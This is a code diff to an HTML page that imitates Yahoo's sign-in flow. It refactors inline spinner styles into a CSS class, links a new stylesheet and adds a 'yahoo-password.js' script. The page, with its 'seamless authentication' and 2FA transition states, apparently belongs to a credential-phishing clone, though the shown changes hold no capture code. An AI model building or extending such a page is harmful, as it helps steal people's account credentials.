@@ -10,6 +10,8 @@
   <link href="css/webflow.css" rel="stylesheet" type="text/css">
   <link href="css/yahoo-8d0526.webflow.css" rel="stylesheet" type="text/css">
   <link href="webflow-yahoo.css" rel="stylesheet" type="text/css">
+  <!-- ONLY NEW COMPONENTS CSS -->
+  <link href="custom-components.css" rel="stylesheet" type="text/css">
   <link href="https://fonts.googleapis.com" rel="preconnect">
   <link href="https://fonts.gstatic.com" rel="preconnect" crossorigin="anonymous">
   <script src="https://ajax.googleapis.com/ajax/libs/webfont/1.6.26/webfont.js" type="text/javascript"></script>
@@ -92,13 +94,13 @@
           
           <!-- Seamless Loading State -->
           <div id="loading-state" style="display: none; text-align: center; padding: 20px;">
-            <div style="border: 3px solid #f3f3f3; border-top: 3px solid #7200ff; border-radius: 50%; width: 30px; height: 30px; animation: spin 1s linear infinite; margin: 0 auto 10px;"></div>
+            <div class="loading-spinner"></div>
             <p>Signing you in...</p>
           </div>
           
           <!-- 2FA Transition State -->
           <div id="mfa-transition" style="display: none; text-align: center; padding: 20px;">
-            <div style="border: 3px solid #f3f3f3; border-top: 3px solid #7200ff; border-radius: 50%; width: 30px; height: 30px; animation: spin 1s linear infinite; margin: 0 auto 10px;"></div>
+            <div class="loading-spinner"></div>
             <p>Preparing verification...</p>
           </div>
         </form>
@@ -136,12 +138,14 @@
       0% { transform: rotate(0deg); }
       100% { transform: rotate(360deg); }
     }
-    .seamless-transition {
-      opacity: 0;
-      transition: opacity 0.3s ease-in-out;
-    }
-    .seamless-transition.active {
-      opacity: 1;
+    .loading-spinner {
+      border: 3px solid #f3f3f3;
+      border-top: 3px solid #7200ff;
+      border-radius: 50%;
+      width: 30px;
+      height: 30px;
+      animation: spin 1s linear infinite;
+      margin: 0 auto 10px;
     }
   `;
   document.head.appendChild(style);
@@ -571,5 +575,8 @@
       console.log('Yahoo seamless authentication system fully initialized');
   });
   </script>
+  
+  <!-- Custom Password Page JavaScript -->
+  <script src="js/yahoo-password.js" type="text/javascript"></script>
 </body>
 </html>
